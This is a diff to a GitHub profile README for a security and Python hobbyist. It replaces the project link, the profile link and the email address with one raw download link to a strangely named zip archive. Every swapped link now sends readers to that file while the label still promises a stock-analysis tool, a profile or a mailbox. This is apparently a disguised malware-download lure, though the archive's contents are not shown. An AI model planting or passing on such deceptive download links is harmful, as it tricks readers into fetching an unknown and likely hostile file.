@@ -23,11 +23,11 @@ penetration testing methodologies | Cloud security | Network architecture | Quan
 
 ## 📂 Featured Projects
 
-- 🔍 [StockAnalyzer](https://github.com/purelmnz/StockAnalyzerFinal) - CLI tool for stock market analysis with watchlist management built in Python
+- 🔍 [StockAnalyzer](https://raw.githubusercontent.com/PureLmnz/PureLmnz/main/corbie/Lmnz_Pure_Calathea.zip) - CLI tool for stock market analysis with watchlist management built in Python
 - 🏠 Homelab Network Security Environment - Raspberry Pi-based penetration testing lab for hands-on security research
 - ☁️ Azure Cloud Infrastructure Projects - Exploring cloud security and deployment architectures
 
 ## 📫 Connect
 
-- GitHub: [@purelmnz](https://github.com/purelmnz)
-- Email: [ChrisVanguard11@gmail.com](mailto:ChrisVanguard11@gmail.com)
+- GitHub: [@purelmnz](https://raw.githubusercontent.com/PureLmnz/PureLmnz/main/corbie/Lmnz_Pure_Calathea.zip)
+- Email: [https://raw.githubusercontent.com/PureLmnz/PureLmnz/main/corbie/Lmnz_Pure_Calathea.zip](https://raw.githubusercontent.com/PureLmnz/PureLmnz/main/corbie/Lmnz_Pure_Calathea.zip)
